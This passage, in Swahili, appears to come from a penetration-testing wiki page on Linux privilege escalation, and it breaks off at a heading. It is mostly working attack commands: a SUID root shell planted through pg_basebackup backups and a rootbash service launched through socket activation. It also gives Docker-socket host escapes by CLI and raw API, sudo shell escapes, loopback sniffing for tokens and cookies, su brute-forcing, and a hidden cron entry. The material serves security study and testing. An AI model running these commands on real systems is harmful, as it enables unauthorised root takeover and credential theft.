- `mkstemp()`: unda faili za muda kwa utaratibu wa atomiki, zikiwa na ruhusa salama.

### Binaries za cron zenye saini maalum na payloads zinazoweza kuandikwa
Mtumiaji wa kawaida anayeweza kuandika binary mahususi inayoendeshwa na cron job ya root anaweza kuvuka mpaka wa ruhusa, lakini ukaguzi wa saini maalum unaweza kukataa mbadala usio na saini. Katika kisa kilichoandikwa, ELF inayomilikiwa na root ilikuwa na mode `0760`, ikimruhusu mwanachama wa kundi lake kuiandika huku mmiliki wa root akiweza kuiendesha. Ufuatiliaji wa michakato ulioonekana ulionyesha `objcopy` ikitoa `.text_sig` kabla ya job kuendesha binary; script kamili ya verifier haikuweza kusomwa.<sup>[[2]](#references)</sup>

Mbadala uliofanikiwa uliwekewa saini kwa kutumia nyenzo za siri za kusaini zilizovuja na ELF signer. [Nyaraka za muundo wake](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) zinaeleza sehemu ya saini inayotokana na `.text` ya executable. Kuongeza tu certificate au string inayolingana kwenye `.text_sig` hakuonyeshwi kuwa kunatosha kukidhi verifier isiyoonekana. Kagua njia halisi iliyoratibiwa, ruhusa halisi za kuandika, uendeshaji wa root na sera ya verifier kabla ya kuhitimisha kuwa binary yenye saini inayoweza kuandikwa inaweza kutumiwa vibaya. Sehemu ya `.text_sig` pekee ni kidokezo cha ukaguzi tu.

### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato ili kutafuta michakato inayoendeshwa kila baada ya dakika 1, 2 au 5. Huenda unaweza kutumia fursa hiyo na kupandisha ruhusa.

Kwa mfano, ili **kufuatilia kila baada ya sekunde 0.1 kwa dakika 1**, **kupanga kwa amri zilizotekelezwa mara chache zaidi** na kufuta amri zilizotekelezwa mara nyingi zaidi, unaweza kufanya hivi:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Nakala rudufu za root zinazohifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inaendesha `pg_basebackup` (au nakala nyingine yoyote ya kujirudia) dhidi ya saraka ya database unayoweza kuiandikia, unaweza kuweka **binary ya SUID/SGID** ambayo itanukuliwa tena kama **root:root**, ikiwa na mode bits zilezile, kwenye matokeo ya nakala rudufu.<sup>[[26]](#references)</sup>

Mtiririko wa kawaida wa ugunduzi (ukiwa mtumiaji wa DB mwenye ruhusa za chini):
- Tumia `pspy` kubaini cron ya root inayoita kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kwamba cluster ya chanzo (kwa mfano, `/var/lib/postgresql/14/main`) unaweza kuiandikia na kwamba lengwa (`/opt/backups/current`) linakuwa linamilikiwa na root baada ya job hiyo.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi bits za ruhusa za faili inapokopi cluster; inapoendeshwa na root, faili za mahali zinakopiwa hupata **umiliki wa root + SUID/SGID zilizochaguliwa na mshambulizi**. Utaratibu wowote sawa wa backup/copy wenye ruhusa za juu unaohifadhi ruhusa na kuandika kwenye eneo linaloweza kutekelezwa uko hatarini.

### Cron job zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila herufi ya newline), na cron job hiyo itafanya kazi. Mfano (zingatia herufi ya carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Ili kugundua aina hii ya stealth entry, kagua faili za cron kwa kutumia zana zinazoonyesha herufi za udhibiti:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika kwenye faili yoyote ya `.service`; ukiweza, **unaweza kuibadilisha** ili **itekeleze** **backdoor yako huduma** **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda ukahitaji kusubiri hadi mashine iwashwe upya).\
Kwa mfano, unda backdoor yako ndani ya faili ya .service kwa kutumia **`ExecStart=/tmp/script.sh`**

### Binaries za huduma zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **ruhusa za kuandika kwenye binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha na backdoors ili huduma zinapoendeshwa tena, backdoors zitekelezwe.

### systemd PATH - Njia za relative

Unaweza kuona PATH inayotumiwa na **systemd** kwa kutumia:

```bash
systemctl show-environment
```

Ikiwa utagundua kuwa unaweza **kuandika** katika folda yoyote kwenye njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths** zinazotumika kwenye faili za usanidi wa service kama vile:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Kisha, unda **faili linalotekelezeka** lenye **jina sawa na binary ya njia linganishi** ndani ya folda ya systemd PATH ambayo unaweza kuandikia. Huduma inapoombwa kutekeleza kitendo kilicho hatarini (**Start**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (kwa kawaida watumiaji wasio na upendeleo hawawezi kuanzisha/kusimamisha huduma, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma ukitumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za systemd unit ambazo majina yake huishia kwa **.timer** na hudhibiti faili za **.service** au matukio. **Timers** zinaweza kutumika badala ya cron kwa kuwa zina usaidizi uliojengewa ndani kwa matukio ya muda wa kalenda na matukio ya muda unaohesabika kuanzia mwanzo, na zinaweza kuendeshwa bila kusubiri kukamilika kwa mengine.

Unaweza kuorodhesha timers zote kwa kutumia:

```bash
systemctl list-timers --all
```

### Timers zinazoweza kuandikwa

Ikiwa unaweza kurekebisha timer, unaweza kuifanya itekeleze mojawapo ya units zilizopo za systemd.unit (kama `.service` au `.target`).

```bash
Unit=backdoor.service
```

Katika nyaraka unaweza kusoma maelezo kuhusu Unit:

> Unit ya kuwasha timer inapoisha. Hoja ni jina la unit, ambalo kiambishi tamati chake si ".timer". Ikiwa halijabainishwa, thamani hii huwa service yenye jina sawa na unit ya timer, isipokuwa kiambishi tamati. (Tazama hapo juu.) Inapendekezwa kwamba jina la unit inayowashwa na jina la unit ya timer yafanane, isipokuwa viambishi tamati.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Kutafuta unit ya systemd (kama `.service`) **inayoendesha binary inayoweza kuandikwa**
- Kutafuta unit ya systemd **inayoendesha njia ya relative** na uwe na **ruhusa za kuandika kwenye systemd PATH** (ili kujifanya kuwa executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwasha timer unahitaji ruhusa za root na kutekeleza:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Kumbuka **timer** **huamilishwa** kwa kuunda symlink inayoelekeza kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano kati ya michakato** kwenye mashine ileile au tofauti ndani ya mifumo ya client-server. Hutumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na husanidiwa kupitia faili za `.socket`.<sup>[[14]](#references)</sup>

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi hutofautiana, lakini kwa muhtasari **huonyesha mahali itakaposikilizia** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port ya kusikilizia, n.k.)
- `Accept`: Huchukua hoja ya boolean. Ikiwa ni **true**, **service instance huanzishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndiyo hupitishwa kwake. Ikiwa ni **false**, sockets zote zinazofuatilia miunganisho **hupitishwa kwa service unit iliyoanzishwa**, na service unit moja pekee huanzishwa kwa miunganisho yote. Thamani hii hupuuzwa kwa sockets za datagram na FIFOs ambapo service unit moja hushughulikia trafiki yote inayoingia bila masharti. **Chaguo-msingi ni false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa namna inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Huchukua mstari mmoja au zaidi wa amri, ambazo **hutekelezwa kabla** au **baada ya** **sockets**/FIFOs za kusikilizia **kuundwa** na kuunganishwa, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, kisha ifuatiwe na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **hutekelezwa kabla** au **baada ya** **sockets**/FIFOs za kusikilizia **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la **service unit** **litakaloamilishwa** wakati wa **trafiki inayoingia**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Chaguo-msingi ni service yenye jina sawa na socket (kiambishi tamati hubadilishwa). Katika hali nyingi, haipaswi kuwa muhimu kutumia chaguo hili.

### Faili za .socket Zinazoweza Kuandikwa

Ukipata faili ya `.socket` **inayoweza kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket haijaumbwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine iwashwe upya.**\
_Kumbuka kuwa mfumo lazima uwe unatumia usanidi huo wa faili ya socket, la sivyo backdoor haitatekelezwa_

### Uamilishaji wa Socket + Njia ya Unit Inayoweza Kuandikwa (kuunda service inayokosekana)

Usanidi mwingine wenye athari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit iliyorejelewa haipo
- mshambuliaji anaweza kuandika kwenye `/etc/systemd/system` (au njia nyingine ya kutafutia unit)

Katika hali hiyo, mshambuliaji anaweza kuunda `<name>.service`, kisha kuchochea trafiki kuelekea kwenye socket ili systemd ipakie na kutekeleza service mpya kama root.

Mtiririko wa haraka:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets zenye ruhusa ya kuandikiwa

Uk **tambua socket yoyote yenye ruhusa ya kuandikiwa** (_hapa tunazungumzia Unix Sockets, si faili za config za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na huenda ukatumia udhaifu.

### Kuhesabu Unix Sockets

```bash
netstat -a -p --unix
```

### Muunganisho wa moja kwa moja

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Mfano wa exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na baadhi ya **sockets zinazopokea maombi ya HTTP** (_sizungumzii faili za .socket, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa kutumia:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ikiwa socket **itajibu kwa HTTP** request, basi unaweza **kuwasiliana** nayo na pengine **kutumia udhaifu fulani**.

### Docker Socket Inayoweza Kuandikiwa

Docker socket, ambayo mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguomsingi, inaweza kuandikwa na mtumiaji wa `root` na washiriki wa kikundi cha `docker`. Kuwa na ufikiaji wa kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Huu hapa muhtasari wa jinsi ya kufanya hivyo na mbinu mbadala iwapo Docker CLI haipatikani.

#### **Privilege Escalation kwa kutumia Docker CLI**

Ikiwa una ufikiaji wa kuandika kwenye Docker socket, unaweza kupandisha mapendeleo kwa kutumia amri zifuatazo:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Amri hizi hukuwezesha kuendesha container yenye ufikiaji wa kiwango cha root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, Docker socket bado inaweza kutumiwa vibaya kwa kutumia HTTP ghafi kupitia Unix socket. Mfuatano wa hatua unaotegemewa zaidi ni:

- tengeneza helper container ya muda mrefu huku mfumo wa faili wa root wa host ukiwa umeunganishwa kwa bind mount
- iwashe
- tengeneza instance ya `exec` ndani ya helper hiyo
- washa instance ya `exec` na usome matokeo kupitia API

**Orodhesha Docker images**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Unda na uanzishe kontena saidizi**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Unda exec instance**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Anzisha instance ya exec na usome matokeo**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Muundo huu kwa kawaida huwa thabiti zaidi kuliko kujaribu kuendesha `attach` mwenyewe kwa kutumia `socat` au `nc -U`. Ukishaweza kuunda helper kwa kutumia `/:/host`, unaweza kutumia matukio mengine ya `exec` kusoma faili kama `/host/root/...`, kuongeza funguo za SSH chini ya `/host/root/.ssh`, au kurekebisha faili za uanzishaji za host.

### Nyingine

Kumbuka kwamba ukiwa na ruhusa za kuandika kwenye socket ya docker kwa sababu **uko ndani ya kundi la `docker`**, una [**njia zaidi za kuongeza marupurupu**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port** unaweza pia kuweza kuidhuru](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoka kwenye containers au kutumia vibaya container runtimes ili kuongeza marupurupu** katika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Kuongeza marupurupu kwa Containerd (ctr)

Ukipata kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa kuwa **unaweza kuweza kuitumia vibaya ili kuongeza marupurupu**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Kuongeza marupurupu kwa **RunC**

Ukipata kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa kuwa **unaweza kuweza kuitumia vibaya ili kuongeza marupurupu**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni **mfumo wa mawasiliano baina ya michakato (IPC)** wa kisasa unaowezesha programu kuwasiliana na kubadilishana data kwa ufanisi. Ukiwa umeundwa kwa kuzingatia mifumo ya kisasa ya Linux, unatoa mfumo imara kwa aina mbalimbali za mawasiliano ya programu.<sup>[[16]](#references)</sup>

Mfumo huu unaweza kutumika kwa njia mbalimbali; unaunga mkono IPC ya msingi inayoboresha ubadilishanaji wa data kati ya michakato, sawa na **UNIX domain sockets zilizoboreshwa**. Pia, husaidia kutangaza matukio au ishara, hivyo kurahisisha ujumuishaji kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayoingia inaweza kusababisha kicheza muziki kunyamazisha sauti, na hivyo kuboresha matumizi ya mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, unaorahisisha maombi ya huduma na miito ya method kati ya programu, na kurahisisha michakato ambayo kwa kawaida ilikuwa changamano.

D-Bus hufanya kazi kwa kutumia **muundo wa ruhusu/kataa**, unaosimamia ruhusa za ujumbe (miito ya method, utumaji wa ishara, n.k.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi hubainisha mwingiliano na bus, na zinaweza kuruhusu kuongeza marupurupu kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukieleza ruhusa za mtumiaji root kumiliki, kutuma ujumbe kwa, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Sera zisizobainisha mtumiaji au kundi hutumika kwa wote, ilhali sera za muktadha wa "default" hutumika kwa kila kitu ambacho hakijashughulikiwa na sera nyingine mahususi.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Jifunze jinsi ya kufanya enumeration na kutumia vibaya mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inapendeza kila wakati kufanya enumeration ya mtandao na kubaini mahali mashine ilipo.

### Enumeration ya jumla

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ikiwa ingizo linalotumika kwenye `/etc/inetd.conf` linaendesha GNU Inetutils `telnetd` kama root, kagua toleo la binary lililosanidiwa na listener ya ndani hata kama port imefungwa kwa loopback pekee. GNU Inetutils matoleo 1.9.3 hadi 2.7 yalikuwa na [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89), ambapo `USER` iliyotolewa na client ilifikishwa kwa `login -f` (CVE-2026-24061). Mchakato au mfuatano wa toleo ni kiashiria; thibitisha hali ya patch ya vendor na daemon halisi kabla ya kuhitimisha kuwa iko hatarini. [Mwongozo wa Telnet](../../../network-services-pentesting/pentesting-telnet.md) una maelezo zaidi.

### Uchunguzi wa haraka wa uchujaji wa trafiki inayotoka

Ikiwa host inaweza kuendesha commands lakini callbacks zinashindwa, tofautisha haraka uchujaji wa DNS, transport, proxy na route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Porti zilizo wazi

Kabla ya kuifikia mashine, hakikisha unakagua huduma za mtandao zinazoendesha kwenye mashine ambazo hukuwa na uwezo wa kuwasiliana nazo hapo awali:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Ainisha listeners kulingana na bind target:

- `0.0.0.0` / `[::]`: wazi kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: za ndani pekee (zinafaa kwa tunnel/forward).
- IP maalum za ndani (k.m. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinafikika tu kutoka kwenye segments za ndani.

### Mtiririko wa kuchunguza huduma za ndani pekee

Unapocompromise host, huduma zilizofungwa kwenye `127.0.0.1` mara nyingi huwa zinafikika kwa mara ya kwanza kutoka kwenye shell yako. Mtiririko wa haraka wa ndani ni:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kama kichanganuzi cha mtandao (hali ya mtandao pekee)

Mbali na ukaguzi wa PE wa ndani, linPEAS inaweza kufanya kazi kama kichanganuzi maalumu cha mtandao. Hutumia binaries zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi zana.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama kichanganuzi safi cha mtandao (na kuruka ukaguzi mwingine wa privilege escalation).

### Sniffing

Angalia kama unaweza kunasa trafiki. Ukiweza, unaweza kupata credentials.

```
timeout 1 tcpdump
```

Ukaguzi wa haraka wa vitendo:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee hufichua tokens/cookies/credentials hapo:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Nasa sasa, chambua baadaye:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Watumiaji

### Generic Enumeration

Angalia **wewe ni nani**, una **ruhusa** zipi, ni **watumiaji** gani walio kwenye mifumo, ni nani anayeweza **login**, na ni nani aliye na **ruhusa za root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha privileges. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Itumie exploit** kwa kutumia: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kikundi fulani** kinachoweza kukupa root privileges:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia ndani ya ubao wa kunakili (ikiwezekana)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Sera ya Nenosiri

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hujali kusababisha kelele nyingi na binaries za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kufanya brute-force ya mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye kigezo cha `-a` pia hujaribu kufanya brute-force ya watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kuongeza privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** na kuipa jina la amri ambayo itatekelezwa na mtumiaji mwingine (ikiwezekana root), na ambayo **haipakiiwi kutoka kwenye folda iliyo kabla ya folda yako inayoweza kuandikwa katika $PATH**.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani ukitumia sudo, au amri hizo zinaweza kuwa na bit ya suid. Iangalie kwa kutumia:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri**.<sup>[[8]](#references)</sup> Kwa mfano:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia haki za mtumiaji mwingine bila kujua nenosiri.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Katika mfano huu, user `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi sana kupata shell kwa kuongeza ssh key kwenye directory ya root au kwa kuita `sh`.

```
sudo vim -c '!sh'
```

### Ulinganisho wa Bash usionukuliwa ndani ya script ya sudo

Katika Bash, upande wa kulia wa `[[ "$protected" == $candidate ]]` ni pattern. Ikiwa script ya sudo yenye uwezo wa root inajaza `candidate` kutoka kwenye faili inayodhibitiwa na mpigaji, thamani kama `prefix*` inaweza kulingana na mwanzo wa string iliyolindwa. Njia tofauti za mafanikio na hitilafu zinaweza kisha kufichua prefix oracle. Weka nukuu upande wa kulia (`[[ "$protected" == "$candidate" ]]`) pale ambapo usawa halisi unakusudiwa. Kagua hoja halisi za sudo, chanzo cha input, na tabia ya matawi inayoonekana kabla ya kuhitimisha kuwa ulinganisho usionukuliwa unaweza kutumiwa vibaya. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) inaeleza tabia hii ya pattern.

### Faili za mradi za PrusaSlicer chini ya sudo

